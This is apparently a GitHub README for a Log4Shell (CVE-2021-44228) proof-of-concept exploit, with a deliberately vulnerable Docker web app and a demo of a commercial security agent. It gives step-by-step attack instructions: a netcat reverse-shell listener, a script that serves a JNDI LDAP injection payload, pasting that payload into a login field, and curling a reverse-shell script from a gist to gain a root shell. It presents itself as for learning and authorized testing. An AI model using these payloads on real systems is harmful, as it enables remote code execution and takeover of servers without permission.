# log4j-shell-poc
A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
Kudos to kozmer for the POC. I just added some niceties for demoing purposes and added the Waratek agent.<br><br>

Setup
----------------------------------------

This works best with two machines. I prefer to spin up 2 droplets on Digital Ocean because it's cheap for test purposes.<br><br>
One machine acts as the target while the other acts as the attacker.<br><br>
Before moving forward, download the following version of Java SE Development Kit `java-8u20` here: https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html<br><br>

Prep
----------------------------------------

- Move the extracted archive for the Java SE Development Kit into the root of this repo
- Upload the root of this repo with the extracted Java SE Development Kit into your attacker machine
- Ensure that `python3` is installed on your attacker machine (if not follow guide here: https://www.digitalocean.com/community/tutorials/how-to-install-python-3-and-set-up-a-programming-environment-on-an-ubuntu-20-04-server)
- Upload the root of this repo without the extracted Java SE Development Kit into your target machine

Steps to Follow
----------------------------------------

#### Start the vulnerable application on the target machine with the following commands

```bash
$ docker build -t log4j-shell-poc .
$ docker run --network host log4j-shell-poc
```

Note: This runs the application without the Waratek Security-as-Code platform. More information on implementing the platform below.<br><br>

### Prep the exploit

- On the attacker machine open 2 shells: One to listen for the reverse shell, and one to run the server
- On the first shell for the attacker machine, open a port with netcat: `$ nc -lvnp 9001`
- On the second shell for the attacker machine, start the webserver that will deliver the exploit payload with: `$ python3 poc.py --userip {attackerIP} --webport 8080 --lport 9001` where `{attackerIP}` is the IP address of the attacker machine
- When the web server launches, you'll receive a payload in the ouput. Copy the payload and open up the vulnerable application in your browser.
- Paste the payload into the email field and put in any value as the password, then press "Sign in."
- The browser should hang and then on the attacker machine shell with netcat running you should see a connection established.
- Download this reverse shell Python script with: `$ curl -O https://gist.githubusercontent.com/jacobwarren/0abf1c5d3d2e969ac8dfcc5a10abf8e8/raw/7dce0c1924c06c20c1471bc4c0824704024c535c/revsh.py`
- Then run it with `$ python3 revsh.py` to establish a TTY
- Now run `$ WHOAMI` to verify that you're indeed root.

```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

#### Requirements:


Vuln Web App:

https://user-images.githubusercontent.com/87979263/146113359-20663eaa-555d-4d60-828d-a7f769ebd266.mp4

<br>

Ghidra (Old script):

https://user-images.githubusercontent.com/87979263/145728478-b4686da9-17d0-4511-be74-c6e6fff97740.mp4

<br>

Minecraft PoC (Old script):

https://user-images.githubusercontent.com/87979263/145681727-2bfd9884-a3e6-45dd-92e2-a624f29a8863.mp4


Proof-of-concept (POC)
----------------------

As a PoC we have created a python file that automates the process. 


#### Requirements:
```bash
pip install -r requirements.txt
```
#### Usage:


* Start a netcat listener to accept reverse shell connection.<br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>
**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

<br>


Our vulnerable application
--------------------------

We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
```c
1: docker build -t log4j-shell-poc .
2: docker run --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080

If you would like to further develop the project you can use Intellij IDE which we used to develop the project. We have also included a `.idea` folder where we have configuration files which make the job a bit easier. You can probably also use other IDE's too.

<br>

Getting the Java version.
--------------------------------------

At the time of creating the exploit we were unsure of exactly which versions of java work and which don't so chose to work with one of the earliest versions of java 8: `java-8u20`.

Oracle thankfully provides an archive for all previous java versions:<br>
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>
Scroll down to `8u20` and download the appropriate files for your operating system and hardware.
![Screenshot from 2021-12-11 00-09-25](https://user-images.githubusercontent.com/46561460/145655967-b5808b9f-d919-476f-9cbc-ed9eaff51585.png)

**Note:** You do need to make an account to be able to download the package.

Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>
**Note:** Please make sure to extract the jdk folder into this repository with the same name in order for it to work.

```
❯ tar -xf jdk-8u20-linux-x64.tar.gz

❯ ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```

Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).

Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.

